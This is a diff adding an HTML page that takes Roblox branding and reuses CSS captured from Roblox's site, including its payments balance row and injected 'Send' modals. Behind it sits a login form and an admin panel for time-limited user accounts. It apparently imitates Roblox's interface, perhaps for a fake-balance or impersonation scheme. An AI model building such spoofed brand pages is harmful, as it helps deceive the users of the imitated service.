@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <script>
+        (function() {
+            try {
+                var t = localStorage.getItem('rbx_theme') || 'dark';
+                var de = document.documentElement;
+                de.classList.remove('light-theme', 'dark-theme');
+                de.classList.add(t + '-theme');
+                de.style.background = t === 'dark' ? '#1b1f2d' : '#ffffff';
+                de.style.colorScheme = t;
+            } catch (e) {}
+        })();
+    </script>
+    <link rel="manifest" href="/manifest.json">
+    <meta name="theme-color" content="#1b1f2d">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="apple-mobile-web-app-title" content="Roblox">
+    <meta name="application-name" content="Roblox">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/svg+xml" href="/icon.svg">
+    <link rel="icon" type="image/png" sizes="192x192" href="/icon-192.png">
+    <link rel="icon" type="image/png" sizes="512x512" href="/icon-512.png">
+    <style id="rbx-pwa-safe-area">
+        :root {
+            --rbx-safe-top: env(safe-area-inset-top, 0px);
+        }
+
+        html {
+            box-sizing: border-box;
+        }
+
+        /* Always apply safe-area to the fixed Roblox header so time/wifi/battery never overlap. */
+
+        .rbx-header,
+        #header,
+        .navbar-fixed-top {
+            padding-top: var(--rbx-safe-top) !important;
+            box-sizing: content-box;
+        }
+
+        /* Push side-nav and content below the bigger header. */
+
+        .rbx-left-col,
+        .left-nav {
+            margin-top: var(--rbx-safe-top);
+        }
+
+        /* NOTE: .container-main keeps its native margin-top (74/82px). The balance row
+     (data-section-type=PAYMENTS_PRODUCT_SECTION_TYPE_TRANSFERS) already adds
+     its own margin-top: env(safe-area-inset-top) via inline React style, so we
+     must NOT add safe-area to .container-main here — that would double-count
+     and create a visible gap between the header bottom and the balance row. */
+
+        /* Restore the 16px right gap on the balance/Send pill at medium+ widths.
+     The native class "medium:margin-right-[16px]" may not resolve in our
+     resource-saver CSS capture, so make it explicit. Higher-specificity
+     selector + force position:static so React inline styles cannot pull the
+     pill back inside the fixed header at ultra-wide viewports. */
+
+        @media (min-width: 768px) {
+            div[data-section-type="PAYMENTS_PRODUCT_SECTION_TYPE_TRANSFERS"],
+            [data-section-type="PAYMENTS_PRODUCT_SECTION_TYPE_TRANSFERS"] {
+                position: static !important;
+                top: auto !important;
+                right: auto !important;
+                align-self: flex-end !important;
+                margin-top: 16px !important;
+                margin-right: 16px !important;
+                margin-left: auto !important;
+            }
+        }
+
+        @media (min-width: 1280px) {
+            [data-section-type="PAYMENTS_PRODUCT_SECTION_TYPE_TRANSFERS"] {
+                margin-right: 24px !important;
+            }
+        }
+
+        body {
+            padding-bottom: env(safe-area-inset-bottom, 0px);
+        }
+
+        /* Hide the "Skip to Main Content" accessibility button. */
+
+        #skip-to-main-content {
+            display: none !important;
+        }
+
+        /* When launched from the home screen, force a comfortable status-bar gap
+     even on devices that report 0 for env(safe-area-inset-top). */
+
+        @media (display-mode: standalone),
+        (display-mode: fullscreen),
+        (display-mode: minimal-ui) {
+            :root {
+                --rbx-safe-top: max(env(safe-area-inset-top, 0px), 28px);
+            }
+        }
+
+        /* iOS PWA tap reliability for our injected modals */
+
+        .rbx-send-backdrop,
+        .rbx-send-modal,
+        .rbx-send-modal * {
+            touch-action: manipulation;
+            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+        }
+
+        .rbx-send-custom {
+            font-size: 16px !important;
+        }
+
+        /* prevent iOS auto-zoom on focus */
+    </style>
+    <meta charset="UTF-8">
+
+    <title>Roblox - Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #f5f7fa;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        @keyframes pulse {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.5;
+            }
+        }
+
+        .animate-pulse {
+            animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Include admin.html partial (login modal + admin panel + edit modal + time notification) -->
+    <div id="app-container"></div>
+
+    <script src="/js/auth.js"></script>
+    <script src="/js/admin.js"></script>
+    <script>
+        // Load the admin.html partial into the page
+        fetch('/pages/admin.html')
+            .then(function(r) {
+                return r.text();
+            })
+            .then(function(html) {
+                document.getElementById('app-container').innerHTML = html;
+                initApp();
+            })
+            .catch(function(err) {
+                console.error('Failed to load admin page:', err);
+                document.getElementById('app-container').innerHTML = '<div style="text-align:center;padding:40px;"><h2>Error loading page</h2><p>Please refresh the page.</p></div>';
+            });
+
+        function initApp() {
+            // Init password toggles
+            initPasswordToggles(['loginPassword', 'newPassword', 'editPassword']);
+
+            // Login form
+            var loginForm = el('loginForm');
+            if (loginForm) {
+                loginForm.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    var username = el('loginUsername').value.trim();
+                    var password = el('loginPassword').value;
+                    if (username && password) login(username, password);
+                });
+            }
+
+            // Contact button toggle
+            var contactBtn = el('contactBtn');
+            if (contactBtn) {
+                contactBtn.addEventListener('click', function() {
+                    var info = el('contactInfo');
+                    if (info) info.classList.toggle('hidden');
+                });
+            }
+
+            // Create user form
+            var createUserForm = el('createUserForm');
+            if (createUserForm) {
+                createUserForm.addEventListener('submit', async function(e) {
+                    e.preventDefault();
+                    var username = el('newUsername').value.trim();
+                    var password = el('newPassword').value;
+                    if (username && password) {
+                        var success = await createUser(username, password);
+                        if (success) {
+                            el('newUsername').value = '';
+                            el('newPassword').value = '';
+                        }
+                    }
+                });
+            }
+
+            // Duration preset selector
+            var presetSelect = el('userDurationPreset');
+            if (presetSelect) {
+                presetSelect.addEventListener('change', function() {
+                    var val = this.value;
+                    if (val !== 'custom') {
+                        var mins = parseInt(val);
+                        var d = Math.floor(mins / 1440);
+                        var h = Math.floor((mins % 1440) / 60);
+                        var m = mins % 60;
+                        el('userDurationDays').value = d;
+                        el('userDurationHours').value = h;
+                        el('userDurationMinutes').value = m;
+                    }
+                });
+            }
+
+            // Admin buttons
+            var adminLogout = el('adminLogout');
+            if (adminLogout) adminLogout.addEventListener('click', logout);
+
+            var adminBackToLogin = el('adminBackToLogin');
+            if (adminBackToLogin) {
+                adminBackToLogin.addEventListener('click', function() {
+                    hideAdminPanel();
+                    logout();
+                });
+            }
+
+            // Delete all expired
+            var deleteAllExpiredBtn = el('deleteAllExpiredBtn');
+            if (deleteAllExpiredBtn) deleteAllExpiredBtn.addEventListener('click', deleteAllExpiredUsers);
+
+            // Edit user form
+            var editUserForm = el('editUserForm');
+            if (editUserForm) {
+                editUserForm.addEventListener('submit', async function(e) {
+                    e.preventDefault();
+                    var userId = el('editUserId').value;
+                    var password = el('editPassword').value;
+                    await editUser(userId, password);
+                });
+            }
+
+            var cancelEditUser = el('cancelEditUser');
+            if (cancelEditUser) cancelEditUser.addEventListener('click', closeEditUserModal);
+
+            // Check auth status
+            checkAuthStatus();
+        }
+    </script>
+
+    <script src="/fix-localhost.js"></script>
+</body>
+
+</html>
